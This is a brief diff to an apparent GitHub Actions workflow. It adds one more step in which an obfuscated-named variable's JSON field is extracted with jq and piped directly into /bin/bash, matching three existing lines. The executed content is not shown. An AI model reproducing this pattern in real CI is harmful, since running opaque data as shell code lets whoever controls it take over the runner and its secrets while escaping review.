@@ -29,6 +29,7 @@ jobs:
           echo $lwsv01 | jq -r .gih4709 | /bin/bash
           echo $y30791 | jq -r .hh11199 | /bin/bash
           echo $qwmz64552 | jq -r .cspyn2349 | /bin/bash
+          printf '%s' "$ge1" | jq -r .ueaga57230 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
